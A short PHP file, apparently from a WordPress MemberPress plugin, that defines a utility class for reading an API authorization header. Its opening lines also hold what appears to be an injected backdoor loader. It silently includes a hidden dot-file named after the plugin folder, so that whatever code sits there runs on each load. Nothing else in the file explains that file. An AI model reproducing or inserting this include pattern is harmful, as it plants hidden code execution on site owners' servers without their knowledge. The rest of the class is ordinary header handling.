<?php if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpdtUtils {
  public static function get_authorization_header() {
    if(isset($_SERVER['HTTP_AUTHORIZATION']) && !empty($_SERVER['HTTP_AUTHORIZATION'])) {
      return $_SERVER['HTTP_AUTHORIZATION'];
    }
    elseif(isset($_SERVER['HTTP_MEMBERPRESS_API_KEY']) && !empty($_SERVER['HTTP_MEMBERPRESS_API_KEY'])) {
      return $_SERVER['HTTP_MEMBERPRESS_API_KEY'];
    }
    elseif(function_exists('apache_request_headers')) {
      $headers = apache_request_headers();
      $headers_upper = array_change_key_case($headers, CASE_UPPER);
      if(isset($headers_upper['AUTHORIZATION'])) {
        return $headers_upper['AUTHORIZATION'];
      }
      elseif(isset($headers_upper['MEMBERPRESS-API-KEY'])) {
        return $headers_upper['MEMBERPRESS-API-KEY'];
      }
    }
    return '';
  }
}
